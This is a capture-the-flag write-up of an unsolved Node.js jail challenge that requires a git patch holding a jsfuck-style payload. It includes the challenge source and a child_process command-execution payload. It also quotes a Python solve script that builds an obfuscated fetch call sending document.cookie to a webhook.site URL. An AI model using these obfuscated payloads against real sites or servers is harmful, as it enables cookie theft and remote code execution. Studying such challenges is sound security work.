# seven7seven

```
bizarre and highly difficult git apply jsfuck golf challenge

nc challs2.pyjail.club 20995

HINT: minimal patch listed below. hmm too bad ! is blocked if only there was an alternative way to do jsfuck ... ? the intended main difficulty point of this challenge is the length limit. also check out the intended sol to "6 char cryptojail" (LINK IN DISCORD ONLY BECAUSE EPIC DISCORD LINKS EXCLUSIVITY MOMENT) from the imaginaryctf dailys, round 40 (solve script is garbage but it should be inspirational)

--- 777
+++ 777
@@ -7 +7 @@
-777
+payload goes here
```

Attachment:

```js
#!/usr/local/bin/node
const { execSync } = require('node:child_process');
const { readFileSync, writeFileSync } = require('fs');
const readline = require('node:readline');
const rl = readline.createInterface({input: process.stdin, output: process.stdout});

rl.question('good luck > ', (patchData) => {
    // length, uniqueness, and antireadability checks
    if (patchData.length > 7*7*7*7
        || (new Set(patchData)).size > 77/7
        || /[a-z]/.test(patchData)
        || new Array(...patchData).some(c => c.charCodeAt(7-7) > 77+7*7)) {
        console.log('sorry i am NOT reading all that');
        rl.close();
        return;
    };

    // multiline input jank and unintended prevention
    patchData = patchData.replaceAll('!', '\n');
    writeFileSync('/tmp/user.patch', patchData);
    writeFileSync('/tmp/777', '777\n');

    // patch the thing
    try {
        execSync('git apply user.patch', {'cwd': '/tmp'});
    } catch {
        console.log('rather subpar patch');
        rl.close();
        return;
    }

    // here we go
    console.log('running');
    require('/tmp/777');

    setTimeout(() => {
        console.log('good bye');
        rl.close();
    }, 4000);
});
```

Not solved in competition.

It requires us to write a patch file so that after patching a file named `777`, the generated file can get flag. If we use `git diff` directly, the resulting diff file is like:

```diff
diff --git a/777 b/payload.js
index 6e68a0f..dcbd360 100644
--- a/777
+++ b/payload.js
@@ -1 +1 @@
-777
+payload here
```

After some testing and reading git source code, we can reduce it to:

```diff
--- 777
+++ 777
@@ -7 +7 @@
-777
+payload here
```

So the charset is `+-@ 7`, also `!` for the newline. There are already 6 characters. For the payload, the first thing comes to mind is [jsfuck](https://jsfuck.com/) where we can convert js code into `()[]!+` characters. However, the limit is 11, so we can only use five more and `!` cannot be used due to the replacement. After some testing, `!` can be replaced by `<`, `>` or `=`. Initially, I use `<` and replace the usage of `!` in jsfuck to make it work. However, the minimum length I can achieve to execute the following payload:

```js
process.mainModule.require('child_process').spawn('ls',{stdio:'inherit'})
```

Requires ~8000 characters, which is much larger than the limit of `7*7*7*7=2401`. Later, the hint was given:

```
HINT: minimal patch listed below. hmm too bad ! is blocked if only there was an alternative way to do jsfuck ... ? the intended main difficulty point of this challenge is the length limit. also check out the intended sol to "6 char cryptojail" (LINK IN DISCORD ONLY BECAUSE EPIC DISCORD LINKS EXCLUSIVITY MOMENT) from the imaginaryctf dailys, round 40 (solve script is garbage but it should be inspirational)

--- 777
+++ 777
@@ -7 +7 @@
-777
+payload goes here
```

The diff is the same as mime. But the real challenge is the length limit. I read the code provided in the discord link:

```python
from esprima import parseScript, nodes
from typing import Callable
from requests import post
from random import randint, seed
import escodegen


def gen_source_from_tree(tree: nodes.Node):
    return escodegen.generate(tree, {"format": escodegen.FORMAT_MINIFY}).rstrip(";")


period = '(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]'
slash = '"/"'
colon = '":"'
hyphen = '(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(+![])+(+![])+(+![])+(+![])+(+![])+(+![])+(+!![]))+[])[!+[]+!+[]]'


def join(*args):
    total = ""
    for index, arg in enumerate(args):
        if index != 0:
            total += "+"
        assert arg is not None, f"failed index {index}"
        total += arg
    return total


sub = {
    ":": colon,
    "/": slash,
    ".": period,
    "-": hyphen,
    "0": '(+![])',
    "1": '(+!![])',
    "2": '(!+[]+!+[])',
    "3": '(!+[]+!+[]+!+[])',
    "4": '(!+[]+!+[]+!+[]+!+[])',
    "5": '(!+[]+!+[]+!+[]+!+[]+!+[])',
    "6": '(!+[]+!+[]+!+[]+!+[]+!+[]+!+[])',
    "7": '(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])',
    "8": '(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])',
    "9": '(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])',
    "a": "(![]+[])[+!+[]]",
    "b": "(this+[])[!+[]+!+[]]",
    "c": "(![]+(this+[]))[+!![]+[]+(+![])]",
    "d": "([][[]]+[])[!+[]+!+[]]",
    "e": "(!+[]+[])[!+[]+!+[]+!+[]]",
    "f": "(![]+[])[+[]]",
    "g": None,
    "h": '"h"',
    "i": '"i"',
    "j": None,
    "k": 'this[([][[]]+[])[!+[]+!+[]]+(this+[])[+!+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+([][[]]+[])[+[]]+((+[])[(![]+(this+[]))[+!![]+[]+(+![])]+(this+[])[+!+[]]+(this+[])[+!+[]+[]+(+![])]+"s"+"t"+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+"t"+(this+[])[+!+[]]+(!![]+[])[+!+[]]]+[])[+!+[]+[]+(+!+[])]+(!+[]+[])[!+[]+!+[]+!+[]]+(this+[])[+!+[]+[]+(+![])]+"t"][(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][+[]]["i"+([][[]]+[])[!+[]+!+[]]]',
    "l": '(![]+[])[!+[]+!+[]]',
    "m": '((+[])[(![]+(this+[]))[+!![]+[]+(+![])]+(this+[])[+!+[]]+(this+[])[+!+[]+[]+(+![])]+"s"+"t"+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+"t"+(this+[])[+!+[]]+(!![]+[])[+!+[]]]+[])[+!+[]+[]+(+!+[])]',
    "n": "(this+[])[+!+[]+[]+(+![])]",
    "o": "(this+[])[+!+[]]",
    "p": '"p"',
    "q": None,
    "r": "(!![]+[])[+!+[]]",
    "s": '"s"',
    "t": '"t"',
    "u": '([][[]]+[])[+[]]',
    "v": None,
    "w": "(this+[])[+!![]+[]+(!+[]+!+[]+!+[])]",
    " ": "(true+[]+this)[+!+[]+[]+(+!+[])]"
}


def make_payload():
    fetch_fn = "this[" + join(*[eval(_) if _ not in sub else sub[_] for _ in "fetch"]) + "]"

    document_cookie = 'this[([][[]]+[])[!+[]+!+[]]+(this+[])[+!+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+([][[]]+[])[+[]]+((+[])[(![]+(this+[]))[+!![]+[]+(+![])]+(this+[])[+!+[]]+(this+[])[+!+[]+[]+(+![])]+"s"+"t"+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+"t"+(this+[])[+!+[]]+(!![]+[])[+!+[]]]+[])[+!+[]+[]+(+!+[])]+(!+[]+[])[!+[]+!+[]+!+[]]+(this+[])[+!+[]+[]+(+![])]+"t"][(![]+(this+[]))[+!![]+[]+(+![])]+(this+[])[+!+[]]+(this+[])[+!+[]]+this[([][[]]+[])[!+[]+!+[]]+(this+[])[+!+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+([][[]]+[])[+[]]+((+[])[(![]+(this+[]))[+!![]+[]+(+![])]+(this+[])[+!+[]]+(this+[])[+!+[]+[]+(+![])]+"s"+"t"+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+(this+[]))[+!![]+[]+(+![])]+"t"+(this+[])[+!+[]]+(!![]+[])[+!+[]]]+[])[+!+[]+[]+(+!+[])]+(!+[]+[])[!+[]+!+[]+!+[]]+(this+[])[+!+[]+[]+(+![])]+"t"][(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][+[]]["i"+([][[]]+[])[!+[]+!+[]]]+"i"+(!+[]+[])[!+[]+!+[]+!+[]]]'

    webhook_site_url = join(*[eval(_) if _ not in sub else sub[_] for _ in "https://webhook.site/5a8edd3d-597b-4d6f-96f1-314ae9f6f48f"])
    total_url = join(webhook_site_url, slash, document_cookie)
    return f"{fetch_fn}({total_url})"


def visit_recursively(n: nodes.Node, callback: Callable) -> nodes.Node:
    t = n.type
    if t == "Program":
        assert len(n.body) == 1, "More than one statement in program!!! It is not allowed"
        n.body[0] = callback(visit_recursively(n.body[0], callback))
        return n
    elif t == "ExpressionStatement":
        n.expression = callback(visit_recursively(n.expression, callback))
    elif t == "CallExpression":
        n.callee = callback(visit_recursively(n.callee, callback))
        for index, arg in enumerate(n.arguments):
            n.arguments[index] = callback(visit_recursively(arg, callback))
    elif t == "MemberExpression":
        assert n.computed
        n.object = callback(visit_recursively(n.object, callback))
        n.property = callback(visit_recursively(n.property, callback))
    elif t == "BinaryExpression":
        n.left = callback(visit_recursively(n.left, callback))
        n.right = callback(visit_recursively(n.right, callback))
    elif t == "ArrayExpression":
        for index, elm in enumerate(n.elements):
            n.elements[index] = callback(visit_recursively(elm, callback))
    elif t == "Identifier":
        return callback(n)
    elif t == "UnaryExpression":
        n.argument = callback(visit_recursively(n.argument, callback))
    elif t == "ThisExpression":
        return callback(n)
    elif t == "AssignmentExpression":
        n.left = callback(visit_recursively(n.left, callback))
        n.right = callback(visit_recursively(n.right, callback))
    return n


def replace_identifiers(n: nodes.Node, key: str, replace_with: nodes.Node):
    if n.type == "Identifier":
        if n.name == key:
            return replace_with
    return n


def replace_nodes_in_tree(n: nodes.Node, to_replace_strred: str, replace_with: nodes.Node):
    if n.type != "Identifier":
        if str(n) == to_replace_strred:
            return replace_with
    return n


def count_node_occurences(exprs: dict[str, nodes.Node]):
    counts = {}
    realities = {}

    def count_callback(n):
        sn = str(n)
        if sn not in counts:
            counts[sn] = 0
            realities[sn] = n
        counts[sn] += 1
        return n

    for expr in exprs:
        visit_recursively(exprs[expr], count_callback)
    return counts, realities


def expand_payload_to_tree(source: str):
    statements = source.split(";")
    substitutions = {}
    for line in statements[:-1]:
        substitutions[line[:line.index("=")]] = line[line.index("=")+1:]
    tree = parseScript(statements[-1])
    for key in reversed(substitutions):
        replacement_object = parseScript(substitutions[key]).body[0].expression
        visit_recursively(tree, lambda n: replace_identifiers(n, key, replacement_object))
    return tree


def parse_expression(expr_as_str: str):
    return parseScript(expr_as_str).body[0].expression


def htpsi_varnames() -> list[str]:
    total = []
    accepted = "htpsi"
    for c in accepted:
        total.append(c)
    for c1 in accepted:
        for c2 in accepted:
            total.append(c1 + c2)
    for c1 in accepted:
        for c2 in accepted:
            for c3 in accepted:
                total.append(c1+c2+c3)
    return total


def gen_source_from_expressions(exprs: dict[str, nodes.Node]):
    root_expr = ""
    prerequisites = ""
    for substitution_varname in exprs:
        if substitution_varname == "root":
            root_expr = gen_source_from_tree(exprs[substitution_varname])
            continue
        prerequisites += f"{substitution_varname}={gen_source_from_tree(exprs[substitution_varname])};"
    return prerequisites + root_expr


def anti_spaces(n: nodes.Node):
    if n.type == "BinaryExpression":
        if n.operator == "+":
            if n.right.type == "UnaryExpression":
                if n.right.operator == "+":
                    stored = n.right
                    n.right = parse_expression('qqqq(' + gen_source_from_tree(stored) + ")")
                    n.right.callee.name = ""
    return n


def build_final_source(exprs: dict[str, nodes.Node]) -> str:
    deps_dict: dict[str, set[str]] = {}

    def count_dependencies(n: nodes.Node, key: str):
        if n.type != "Identifier":
            return n
        if key not in deps_dict:
            deps_dict[key] = set()
        deps_dict[key].add(n.name)
        return n

    # check the dependencies of each variable
    for varname in exprs:
        visit_recursively(exprs[varname], lambda node: count_dependencies(node, varname))
        if varname not in deps_dict:
            deps_dict[varname] = set()

    # ordered is the list of all dependencies in order to avoid any "variable not found" errors
    ordered = []
    while True:
        for varname in deps_dict:
            deps = deps_dict[varname]
            for dep in deps:
                if dep not in ordered:
                    break
            else:
                ordered.append(varname)
                deps_dict.pop(varname)
                break
        else:
            break

    final = ""
    for order in ordered:
        if order == "root":
            final += gen_source_from_tree(exprs[order])
            break
        final += order
        final += "="
        final += gen_source_from_tree(exprs[order])
        final += ";"

    # anti-spaces
    things = final.split(";")
    total = []
    for thing in things:
        tree = parseScript(thing)
        visit_recursively(tree, anti_spaces)
        total.append(tree)

    return ";".join(gen_source_from_tree(_) for _ in total)


def send_payload(final: str):
    seed_this = post(f"http://localhost:8080/report", data={"offering": "", "bribe": "1337"})
    seed(int(seed_this.text.split(" ")[-1]))
    real_bribe = randint(-1234567, 7654321)

    resp = post(f"http://localhost:8080/report", data={"offering": final, "bribe": str(real_bribe)})
    print(resp.text)


def count_identifier_occurences(exprs: dict[str, nodes.Node]):
    counts = {}
    realities = {}

    def count_callback(n):
        if n.type == "Identifier":
            sn = str(n)
            if sn not in counts:
                counts[sn] = 0
                realities[sn] = n
            counts[sn] += 1
        return n

    for expr in exprs:
        visit_recursively(exprs[expr], count_callback)
    return counts, realities


def remap_variable_names(exprs: dict[str, nodes.Node]) -> dict[str, nodes.Node]:
    good_varnames = htpsi_varnames()
    temp_varnames = []
    for a in "abcde":
        for b in "abcde":
            for c in "abcde":
                temp_varnames.append(a+b+c)
    good_exprs = {}
    better_exprs = {}
    name_temp_map = {}
    counts, realities = count_identifier_occurences(exprs)
    sorted_keys = sorted(counts.keys(), key=lambda n: counts[n], reverse=True)
    for key in sorted_keys:
        old_name = realities[key].name
        new_temp_name = temp_varnames.pop(0)
        name_temp_map[old_name] = new_temp_name
        print(f"{old_name} -> {new_temp_name} (~{counts[key]} usages)")
        good_exprs[new_temp_name] = exprs[old_name]
        for expr_name in exprs:
            visit_recursively(exprs[expr_name], lambda n: replace_identifiers(n, old_name, parse_expression(new_temp_name)))
    good_exprs["root"] = exprs["root"]
    counts, realities = count_identifier_occurences(good_exprs)
    sorted_keys = sorted(counts.keys(), key=lambda n: counts[n], reverse=True)
    for key in sorted_keys:
        old_temp_name = realities[key].name
        new_name = good_varnames.pop(0)
        print(f"{old_temp_name} -> {new_name} (~{counts[key]} usages)")
        better_exprs[new_name] = good_exprs[old_temp_name]
        for expr_name in exprs:
            visit_recursively(exprs[expr_name], lambda n: replace_identifiers(n, old_temp_name, parse_expression(new_name)))
    better_exprs["root"] = good_exprs["root"]
    return better_exprs


# noinspection PyUnboundLocalVariable
def main():
    # initialize stuff
    og_source = make_payload()
    print(og_source)
    enumeratable_varnames = htpsi_varnames()
    expressions = {"root": parseScript(og_source)}
    # start the magic
    round_index = 0
    while True:
        round_index += 1
        print("="*60)
        print(f"starting round {round_index}\tLength in bytes: {len(gen_source_from_expressions(expressions))}")
        print(gen_source_from_expressions(expressions))
        print("="*60)
        # count the occurences of each node for all expressions
        str_counts, str_to_node = count_node_occurences(expressions)
        # max compression variables
        max_crate = 0
        max_count = 0
        max_min_length = 0
        max_cnode = None
        max_cexpressions = None
        # enumerate over all AST nodes in decreasing order of usage
        for str_key in sorted(str_counts, key=lambda _: str_counts[_], reverse=True):
            count = str_counts[str_key]
            # not possible to compress something that occurs only once
            if count == 1:
                continue
            # the variable name we substitute in
            varname = enumeratable_varnames[0]
            varname_node = parse_expression(varname)
            # make a copy of the tree by using string immutability (basically a stringify then parse)
            experimental_exprs = {}
            for expr in expressions:
                experimental_exprs[expr] = parseScript(gen_source_from_tree(expressions[expr]))
            # visit the copied tree recursively, replacing all occurences of the attempted node to the varname node
            for expr in experimental_exprs:
                visit_recursively(experimental_exprs[expr], lambda _: replace_nodes_in_tree(_, str_key, varname_node))
            # determine old expression dictionary length
            old_length = len(gen_source_from_expressions(expressions))
            # check the new length of the tree
            new_length = len(gen_source_from_expressions(experimental_exprs))+len(gen_source_from_tree(str_to_node[str_key]))
            new_length += 2
            new_length += len(varname)
            # get the compression rate
            compression_rate = int(10000*(old_length-new_length)/old_length)/100
            # set the new max if the node is good
            if max_crate < compression_rate and new_length < old_length:
                print(f"New greatest compression: {compression_rate}%")
                max_crate = compression_rate
                max_count = count
                max_cnode = str_to_node[str_key]
                max_min_length = new_length
                max_cexpressions = experimental_exprs
        if max_cnode is None:
            break
        # done checking all node possibilities
        print(f"Replace {max_count} occurences with {max_crate}% compression ({old_length} -> {max_min_length})")
        expressions = max_cexpressions
        expressions[varname] = max_cnode
        enumeratable_varnames.pop(0)
    expressions = remap_variable_names(expressions)
    final = build_final_source(expressions).replace("'+'", '')
    print("="*60)
    print(f"{len(final)} char payload")
    print("="*60)
    print(final)
    print("="*60)

    send_payload(final)


def gen_string(_: str) -> str:
    return join(*[eval(_) if _ not in sub else sub[_] for _ in _])


if __name__ == '__main__':
    main()
```

It works like:

1. generate the payload just like jsfuck
2. replace duplicate ast nodes by prepending `a=xxx;` and replacing all occurrences of `xxx` to `a`

However, it requires a valid identifier for the name and two extra characters: `=` and `;`. It is possible to do these by using an extra level of `eval`, but I stopped my attempts here.
